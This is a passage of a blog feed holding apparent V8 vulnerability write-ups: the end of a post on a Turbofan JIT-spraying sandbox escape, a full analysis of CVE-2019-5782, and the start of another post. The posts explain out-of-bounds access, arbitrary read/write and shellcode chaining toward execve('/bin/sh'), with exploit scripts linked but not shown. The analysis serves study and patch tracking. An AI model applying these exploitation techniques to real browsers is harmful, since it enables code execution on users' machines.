href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/objects/code.h#L686"><code>IsOffHeapTrampoline</code></a>, which is the 30th bit of the flags, is set. If true, it calculates the start address of the instructions of the function by simply adding <code>0x3f</code> to the address of the <code>Code</code> object, and jumps to the instructions.</p><p>If we can overwrite the <code>code</code> field of the function, we can divert the execution flow to an arbitrary address inside the V8 sandbox.</p><h3 id="Optimising-CreateArrayLiteral"><a href="#Optimising-CreateArrayLiteral" class="headerlink" title="Optimising CreateArrayLiteral"></a>Optimising CreateArrayLiteral</h3><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/8.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/9.png"></p><p><code>CreateArrayLiteral</code> is a bytecode instruction used to create a new array in a function. The function contains an <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/objects/literal-objects.tq#L5"><code>ArrayBoilerplateDescription</code></a> object, which serves as a template for the array created in the function, in its constant pool.</p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/10.png"></p><p><a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/objects/literal-objects.tq#L7"><code>constant_elements</code></a> is a <code>FixedArrayBase</code> object (<code>FixedArray</code>, <code>FixedInt64Array</code>, <code>FixedDoubleArray</code>, …) depending on the type of elements of the array. <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/runtime/runtime-literals.cc#L452"><code>CreateArrayLiteral()</code></a> copies <code>constant_elements</code> to <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/runtime/runtime-literals.cc#L465"><code>copied_elements_values</code></a> and uses them to <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/runtime/runtime-literals.cc#L511">create</a> a new array.</p><p>When Turbofan compiles the function, the <code>CreateArrayLiteral</code> instruction is converted to a <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/bytecode-graph-builder.cc#L2329"><code>JSCreateLiteralArray</code></a> node, which also references the boilerplate object.</p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/11.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/12.png"></p><p><code>JSCreateLiteralArray</code> node is lowered in the <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/pipeline.cc#L1493"><code>TypedLoweringPhase</code></a>. <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/js-create-lowering.cc#L1096"><code>JSCreateLowering::ReduceJSCreateLiteralArrayOrObject()</code></a> calls <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/js-create-lowering.cc#L1111"><code>JSCreateLowering::TryAllocateFastLiteral()</code></a> to optimise the allocation of an array in case <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/js-create-lowering.cc#L1105"><code>feedback</code></a> is sufficient. <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/js-create-lowering.cc#L1666"><code>JSCreateLowering::TryAllocateFastLiteral()</code></a> calls <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/js-create-lowering.cc#L1808"><code>JSCreateLowering::TryAllocateFastLiteralElements()</code></a> to optimise the allocation of the elements array. <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/js-create-lowering.cc#L1834"><code>JSCreateLowering::TryAllocateFastLiteralElements()</code></a> gets <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/js-create-lowering.cc#L1843"><code>boilerplate_elements</code></a> from the boilerplate object, and if <code>boilerplate_elements</code> is a <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/js-create-lowering.cc#L1858"><code>FixedDoubleArray</code></a> object, it adds <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/js-create-lowering.cc#L1867"><code>NumberConstant</code></a> nodes for all elements.</p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/13.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/14.png"></p><p>These constants are lowered in <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/pipeline.cc#L1577"><code>SimplifiedLoweringPhase</code></a>. When <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/simplified-lowering.cc#L1992"><code>RepresentationSelector::VisitNode</code></a> encounters a <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/simplified-lowering.cc#L3383"><code>StoreElement</code></a> node, it calls <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/simplified-lowering.cc#L3400"><code>RepresentationSelector::ProcessInput()</code></a> for each input node. For the elements of the array, <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/simplified-lowering.cc#L4191"><code>RepresentationSelector::ProcessInput()</code></a> calls <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/simplified-lowering.cc#L4196"><code>RepresentationSelector::ConvertInput()</code></a> → <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/simplified-lowering.cc#L895"><code>RepresentationChanger::GetRepresentationFor()</code></a> → <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/representation-change.cc#L223"><code>RepresentationChanger::GetFloat64RepresentationFor()</code></a>, and <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/representation-change.cc#L690"><code>RepresentationChanger::GetFloat64RepresentationFor()</code></a> creates a new <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/representation-change.cc#L702"><code>Float64Constant</code></a> node. The old <code>NumberConstant</code> node is <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/simplified-lowering.cc#L897">replaced</a> with the new <code>Float64Constant</code> node.</p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/15.png"></p><p>The <code>Float64Constant</code> node is handled by <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/backend/instruction-selector.cc#L1431"><code>InstructionSelectorT::VisitConstant()</code></a> in <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/pipeline.cc#L2165"><code>InstructionSelectionPhase</code></a>. <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/backend/instruction-selector.cc#L2926"><code>InstructionSelectorT::VisitConstant()</code></a> calls <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/backend/instruction-selector.cc#L2930"><code>OperandGeneratorT::DefineAsConstant()</code></a> → <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/backend/instruction-selector-impl.h#L111"><code>InstructionSequence::AddConstant()</code></a>, and <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/backend/instruction.h#L1726">inserts</a> a pair of register and constant into <code>constants_</code>.</p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/16.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/17.png"></p><p>This pair is assembled to the <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/backend/x64/code-generator-x64.cc#L5011"><code>mov</code></a> instruction by <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/backend/x64/code-generator-x64.cc#L4847"><code>CodeGenerator::AssembleMove()</code></a> in <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/compiler/pipeline.cc#L2385"><code>AssembleCodePhase</code></a>. The constant is inserted into the assembly code in the form of <code>uint64_t</code>.</p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/18.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/19.png"></p><p>In conclusion, we can insert arbitrary 8-byte floating-point numbers, which can be potentially used for <a href="https://en.wikipedia.org/wiki/JIT_spraying">JIT spraying</a>, into the assembly code of the function.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Spray-shellcode"><a href="#Spray-shellcode" class="headerlink" title="Spray shellcode"></a>Spray shellcode</h3><p>We can execute up to 8-byte shellcode by inserting it into the assembly code of the Turbofan-compiled function and moving <code>rip</code> to where the shellcode lies by overwriting the <code>code</code> pointer of the <code>JSFunction</code> object.</p><p>However, it’d be impossible to do what we want to, for example, <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>, with only 8 bytes of assembly code. Therefore, we must chain several shellcode segments using a relative <a href="https://www.felixcloutier.com/x86/jmp"><code>jmp</code></a> instruction. The distances between the floating-point numbers in the code are consistent, so we can make each segment jump to the next one by constructing each one with a 6-byte shellcode and a 2-byte <code>jmp</code> instruction.</p><p><a href="shellcode.py"><code>shellcode.py</code></a></p><h3 id="Hijack-execution-flow"><a href="#Hijack-execution-flow" class="headerlink" title="Hijack execution flow"></a>Hijack execution flow</h3><p>If the <code>IsOffHeapTrampoline</code> flag of the <code>Code</code> object is set, <code>rip</code> takes an unexpected path.</p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/20.png"></p><p>In this case, we fail to divert the execution flow of the function to the intended path.</p><p><code>rcx + 0x1b</code> would be in the middle of the assembly instructions, thus it’s not a good idea to attempt to control the value there. Instead, we can add a dummy element that changes the offset of the shellcode from the instruction start to the array constructed in the Turbofan-compiled function, and hope it passes the test.</p><p><a href="pwn.js"><code>pwn.js</code></a></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/pwn.png"></p><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><blockquote><p><a href="https://github.com/v8/v8/commit/fd608d18b59eaaafa8928fe49fc7624f31bcccfa">[ext-code-space] Enable external code space on x64 and desktop arm64</a> (Jan 26, 2022)</p><p><a href="https://github.com/v8/v8/commit/aefa66da282145f1195759efc15a00964da2b9dd">Revert “[ext-code-space] Enable external code space on x64 and desktop arm64”</a> (Jan 26, 2022)</p><p><a href="https://github.com/v8/v8/commit/e7ffb2570ce4ac8c0a1b9a1dfd0b3fcb3227bba9">[ext-code-space] Enable external code space on x64 and desktop arm64</a> (Jan 27, 2022)</p><p><a href="https://github.com/v8/v8/commit/f9ae535aca6d92830ffa7a9bf83ddeeab4602d78">Revert “[ext-code-space] Enable external code space on x64 and desktop arm64”</a> (Jan 28, 2022)</p><p><a href="https://github.com/v8/v8/commit/5351e0e805e6e7081250b5b9a015dcff8157d1dc">[ext-code-space] Enable external code space on x64 and desktop arm64</a> (Jan 28, 2022)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> N-day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chromium </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-5782: Improper Typing for arguments.length by Turbofan Leading to RCE (7.2.41 &lt;= V8 &lt; 7.3.1)</title>
      <link href="/2023/05/06/CVE-2019-5782/"/>
      <url>/2023/05/06/CVE-2019-5782/</url>
      
        <content type="html"><![CDATA[<p>In this post, I will analyse and exploit CVE-2019-5782, which is a bug caused by the improper implementation of Turbofan, a JIT compiler in V8. We can exploit the mishandling of <code>arguments.length</code> by Turbofan to trigger out-of-bounds access and achieve arbitrary code execution.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li>Ubuntu 20.04 (WSL)</li><li><a href="https://github.com/v8/v8/commit/18b28402118b7918512c3e5b6bc5c6f348d43564"><code>18b28402118b7918512c3e5b6bc5c6f348d43564</code></a> (Nov 30, 2018)</li></ul><p>Run <a href="setup.py"><code>setup.py</code></a> in the working directory.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Typing-arguments-length"><a href="#Typing-arguments-length" class="headerlink" title="Typing arguments.length"></a>Typing arguments.length</h3><p><code>arguments.length</code> implies the length of the <a href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Functions/arguments"><code>arguments</code></a> object.</p><p><img src="/2023/05/06/CVE-2019-5782/1.png"></p><p><img src="/2023/05/06/CVE-2019-5782/2.png"></p><p>From the viewpoint of Turbofan, the valid number of arguments of a function is between 0 and <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/objects/code.h#L435"><code>Code::kMaxArguments</code></a>, which equals <code>0xfffe</code>, as defined by <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/type-cache.h#L169"><code>TypeCache::kArgumentsLengthType</code></a>. Therefore, when Turbofan encounters <code>arguments.length</code> while compiling a function, it sets the <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/typer.cc#L379"><code>type</code></a> of the node to <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/typer.cc#L2216"><code>TypeCache::kArgumentsLengthType</code></a>.</p><p><img src="/2023/05/06/CVE-2019-5782/3.png"></p><p><img src="/2023/05/06/CVE-2019-5782/4.png"></p><p><img src="/2023/05/06/CVE-2019-5782/5.png"></p><h3 id="Root-cause"><a href="#Root-cause" class="headerlink" title="Root cause"></a>Root cause</h3><p>However, we can naturally pass more than <code>0xfffe</code> arguments to a function. Then, the node corresponding to <code>arguments.length</code> is mistyped, and it can lead to type confusion.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Trigger-OOB-using-the-right-shift-operator"><a href="#Trigger-OOB-using-the-right-shift-operator" class="headerlink" title="Trigger OOB using the right shift operator"></a>Trigger OOB using the right shift operator</h3><p><a href="oob.js"><code>oob.js</code></a></p><p><img src="/2023/05/06/CVE-2019-5782/6.png"></p><p>The right shift (<code>&gt;&gt;</code>) operator is interpreted as the <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/interpreter/interpreter-generator.cc#L1051"><code>ShiftRight</code></a> (or <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/interpreter/interpreter-generator.cc#L1138"><code>ShiftRightSmi</code></a> in case the right operand is an integer) bytecode instruction.</p><p><img src="/2023/05/06/CVE-2019-5782/7.png"></p><p>In the <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/pipeline.cc#L1013"><code>GraphBuilderPhase</code></a> of Turbofan compilation, a <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/js-type-hint-lowering.cc#L132"><code>SpeculativeNumberShiftRight</code></a> node is built from the <code>ShiftRight</code> instruction.</p><p><img src="/2023/05/06/CVE-2019-5782/8.png"></p><p>In <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/pipeline.cc#L1119"><code>TyperPhase</code></a>, <code>SpeculativeNumberShiftRight</code> is typed for the first time. <code>Arguments.length</code> is not optimised yet at this point, so the <code>LoadField</code> node responsible for reading the <code>length</code> field of <code>arguments</code> is passed as the left operand.</p><p><img src="/2023/05/06/CVE-2019-5782/9.png"></p><p>The type is calculated by <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/operation-typer.cc#L959"><code>OperationTyper::NumberShiftRight()</code></a>, called by <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/operation-typer.cc#L1110"><code>OperationTyper::SpeculativeNumberShiftRight()</code></a>. The logic is intuitive. It sets <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/operation-typer.cc#L977"><code>min</code></a> to the smaller value between <code>min_lhs &gt;&gt; min_rhs</code> and <code>min_lhs &gt;&gt; max_rhs</code>, and sets <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/operation-typer.cc#L978"><code>max</code></a> to the larger value between <code>max_lhs &gt;&gt; min_rhs</code> and <code>max_lhs &gt;&gt; max_rhs</code>.</p><p><img src="/2023/05/06/CVE-2019-5782/10.png"></p><p>As a result, the initial type of <code>SpeculativeNumberShiftRight</code> is set to <code>Range(-32768, 32767)</code>.</p><p><img src="/2023/05/06/CVE-2019-5782/11.png"></p><p>In <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/pipeline.cc#L1192"><code>TypedLoweringPhase</code></a>, <code>JSCreateArguments</code> is reduced by <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/js-create-lowering.cc#L169"><code>JSCreateLowering::ReduceJSCreateArguments()</code></a>. The nodes responsible for storing <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/js-create-lowering.cc#L210"><code>arguments_map</code></a>, <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/js-create-lowering.cc#L211"><code>properties</code></a>, <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/js-create-lowering.cc#L212"><code>elements</code></a>, <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/js-create-lowering.cc#L213"><code>arguments_length</code></a>, and <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/js-create-lowering.cc#L214"><code>callee</code></a> are created, and <code>JSCreateArguments</code> is converted to a <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/allocation-builder.h#L72"><code>FinishRegion</code></a> node by <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/js-create-lowering.cc#L216"><code>AllocationBuilder::FinishAndChange()</code></a>.</p><p><img src="/2023/05/06/CVE-2019-5782/12.png"></p><p><img src="/2023/05/06/CVE-2019-5782/13.png"></p><p>In <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/pipeline.cc#L1400"><code>LoadEliminationPhase</code></a>, the <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/load-elimination.cc#L114"><code>LoadField</code></a> node is reduced by <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/load-elimination.cc#L115"><code>LoadElimination::ReduceLoadField()</code></a>. The output of <code>LoadField</code>, which is the length of the <code>arguments</code> object, already exists in the graph as an <code>ArgumentsLength</code> node. <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/load-elimination.cc#L787"><code>LoadElimination::ReduceLoadField()</code></a> <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/load-elimination.cc#L807">looks</a> for the <code>ArgumentsLength</code> from the graph, and <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/load-elimination.cc#L822">replaces</a> the current <code>LoadField</code> with the <code>ArgumentsLength</code>.</p><p><img src="/2023/05/06/CVE-2019-5782/14.png"></p><p><img src="/2023/05/06/CVE-2019-5782/15.png"></p><p>In <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/pipeline.cc#L1245"><code>SimplifiedLoweringPhase</code></a>, <code>SpeculativeNumberShiftRight</code> is typed again by <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/simplified-lowering.cc#L453"><code>OperationTyper::NumberShiftRight()</code></a>, called by <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/simplified-lowering.cc#L416"><code>RepresentationSelector::UpdateFeedbackType()</code></a>. The logic is the same as in <code>TyperPhase</code>,  but the type of left input node is <code>TypeCache::kArgumentsLengthType</code> at this time, resulting in both <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/operation-typer.cc#L977"><code>min</code></a> and <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/operation-typer.cc#L978"><code>max</code></a> being 0.</p><p><img src="/2023/05/06/CVE-2019-5782/16.png"></p><p>The result of <code>SpeculativeNumberShiftRight</code> is used as <code>idx</code> to get an element from <code>arr</code>. The <code>CheckBounds</code> node is responsible for preventing out-of-bounds. It takes the index as the first input and the length of the array as the second, and checks if the index is less than the length.</p><p><img src="/2023/05/06/CVE-2019-5782/17.png"></p><p>Also in <code>SimplifiedLoweringPhase</code>, <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/simplified-lowering.cc#L2611"><code>CheckBounds</code></a> is reduced by <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/simplified-lowering.cc#L1523"><code>RepresentationSelector::VisitCheckBounds()</code></a>. In case <code>index_type.Max()</code> is smaller than <code>length_type.Min()</code>, there’s no possibility of out-of-bounds, so <code>VisitCheckBounds()</code> calls <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/compiler/simplified-lowering.cc#L1542"><code>RepresentationSelector::DeferReplacement()</code></a> to remove <code>CheckBounds</code>.</p><p><img src="/2023/05/06/CVE-2019-5782/18.png"></p><p><img src="/2023/05/06/CVE-2019-5782/19.png"></p><p>After compilation is finished, <code>f()</code> takes <code>0x10000</code> arguments, but Turbofan didn’t consider it possible. The bounds check was already removed because Turbofan assumed that <code>idx</code> is always 0. However, <code>idx</code> becomes 1 this time, so we can access the out-of-bounds of <code>arr</code> and read the value at the location corresponding to <code>arr[1]</code>.</p><p><img src="/2023/05/06/CVE-2019-5782/20.png"></p><h3 id="Obtain-OOB-array"><a href="#Obtain-OOB-array" class="headerlink" title="Obtain OOB array"></a>Obtain OOB array</h3><p>We can access the length field of an array using OOB.</p><p><img src="/2023/05/06/CVE-2019-5782/21.png"></p><p><img src="/2023/05/06/CVE-2019-5782/22.png"></p><p>Even if we overwrite the length field of the array with a larger value, the array of elements stays put.</p><p><img src="/2023/05/06/CVE-2019-5782/23.png"></p><p><img src="/2023/05/06/CVE-2019-5782/24.png"></p><p>Via this OOB array, we can access elements beyond the bounds of the array, like <code>arr[100]</code>, which should be <code>undefined</code> under normal circumstances.</p><p><img src="/2023/05/06/CVE-2019-5782/25.png"></p><h3 id="Get-the-address-of-an-arbitrary-object"><a href="#Get-the-address-of-an-arbitrary-object" class="headerlink" title="Get the address of an arbitrary object"></a>Get the address of an arbitrary object</h3><p>An array containing JavaScript objects contains their addresses in its memory.</p><p><img src="/2023/05/06/CVE-2019-5782/26.png"></p><p><img src="/2023/05/06/CVE-2019-5782/27.png"></p><p><img src="/2023/05/06/CVE-2019-5782/28.png"></p><p>We can place an array of objects right behind the OOB array we obtained above, and read the value stored in the array of objects via the OOB array. Then, we can get the address of an arbitrary object in the form of a floating-point number.</p><h3 id="Arbitrary-address-read-write"><a href="#Arbitrary-address-read-write" class="headerlink" title="Arbitrary address read&#x2F;write"></a>Arbitrary address read&#x2F;write</h3><p><a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/objects/js-array-buffer.h#L185"><code>JSTypedArray</code></a> has a <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/objects/fixed-array.h#L575"><code>FixedTypedArrayBase</code></a> object in its elements field. <code>FixedTypedArrayBase</code> has a <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/objects/fixed-array.h#L578"><code>base_pointer</code></a> that points to the object itself, and an <a href="https://github.com/v8/v8/blob/18b28402118b7918512c3e5b6bc5c6f348d43564/src/objects/fixed-array.h#L583"><code>external_pointer</code></a>, which indicates the distance between the <code>base_pointer</code> and the actual data.</p><p><img src="/2023/05/06/CVE-2019-5782/29.png"></p><p><img src="/2023/05/06/CVE-2019-5782/30.png"></p><p>We can place a <code>JSTypedArray</code> right behind the OOB array we obtained above, and overwrite <code>base_pointer</code> and <code>external_pointer</code> with an arbitrary address and 0, respectively. Then, we can read the value at the address through that array, and any value we store in that array would be written to that address.</p><p><a href="rw.js"><code>rw.js</code></a></p><p><img src="/2023/05/06/CVE-2019-5782/31.png"></p><p><img src="/2023/05/06/CVE-2019-5782/32.png"></p><h3 id="Arbitrary-code-execution"><a href="#Arbitrary-code-execution" class="headerlink" title="Arbitrary code execution"></a>Arbitrary code execution</h3><blockquote><a href="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/" title="Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><p>Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 < 10.0.138)</p></a></blockquote><p><a href="pwn.wat"><code>pwn.wat</code></a> <a href="shellcode.py"><code>shellcode.py</code></a> <a href="pwn.js"><code>pwn.js</code></a></p><p><img src="/2023/05/06/CVE-2019-5782/pwn.png"></p><h2 id="Bisection"><a href="#Bisection" class="headerlink" title="Bisection"></a>Bisection</h2><blockquote><p><a href="https://github.com/v8/v8/commit/bac7dad666ae203e04b5ff68d838ed2ea5f03e26">[Build] Disable build-time untrusted code mitigations on non-Android platforms and ia32.</a> (Oct 18, 2018)</p><p>Non-Android platforms are protected in Chrome by site isolation, therefore we can disable the untrusted code mitigations. We still enable them on Android, and on simulator builds since that is where we do much of the correctness testing for Android.</p></blockquote><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><blockquote><p><a href="https://github.com/v8/v8/commit/4e3a17d0408627517d4a81b3bf5daf85e416e9ac">[runtime] Reduce spread&#x2F;apply call max arguments</a> (Nov 22, 2018)</p><p><a href="https://github.com/v8/v8/commit/ff0cf00c72c2b7e12f6e15a575604c8a26ab4364">Revert “[runtime] Reduce spread&#x2F;apply call max arguments”</a> (Nov 30, 2018)</p><p><a href="https://github.com/v8/v8/commit/8e4588915ba7a9d9d744075781cea114d49f0c7b">[turbofan] Relax range for arguments object length</a> (Nov 30, 2018)</p></blockquote><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://chromereleases.googleblog.com/2019/01/stable-channel-update-for-desktop.html">Stable Channel Update for Desktop (Tuesday, January 29, 2019) - Chrome Releases</a></li><li><a href="https://issues.chromium.org/issues/40093090">Security: Tianfu CUP RCE - Chromium Issues</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> N-day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chromium </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 2 (10.0.138 &lt;= V8 &lt; 10.3.163)</title>
      <link href="/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/"/>
      <url>/2023/04/30/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-2/</url>
      
